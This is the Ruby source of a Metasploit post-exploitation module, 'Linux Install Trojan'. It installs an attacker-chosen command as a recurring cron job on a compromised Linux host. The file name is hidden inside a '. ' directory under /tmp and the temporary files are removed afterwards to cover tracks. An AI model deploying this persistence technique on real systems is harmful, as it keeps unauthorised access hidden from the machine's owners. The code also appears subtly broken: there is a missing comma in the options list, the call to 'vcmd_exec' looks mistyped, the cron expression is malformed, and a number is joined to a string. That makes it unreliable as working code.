##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Install Trojan',
				'Description'   => %q{
					This module installs a Linux Trojan to run frequently via CRON.
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'Joshua D. Abraham <jabra[at]praetorian.com>',
					],
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ]
			))
			register_options(
					[
						OptString.new('COMMAND', [true, 'The command to run.', 'touch /tmp/test.txt'])
						OptString.new('FREQ', [true, 'Frequency in minutes to run this command.', 40])		
					], self.class)
	end

	def run
		print_status "Installing trojan to run : #{datastore['COMMAND']}"

		vcmd_exec("mkdir -p /tmp/'. '")
    file = rand_text_alpha(128)
		vcmd_exec("crontab -l > /tmp/'. '/.#{file}")
		vcmd_exec('echo "0/' + datastore['FREQ'] + ' * * * * ' + datastore['COMMAND'] + '" >> ' + "/tmp/'. '/.#{file}")
		vcmd_exec("crontab /tmp/'. '/.#{file}")
		vcmd_exec("rm /tmp/'. '/.#{file}")
		vcmd_exec("rm -Rf /tmp/'. '")
	end
end
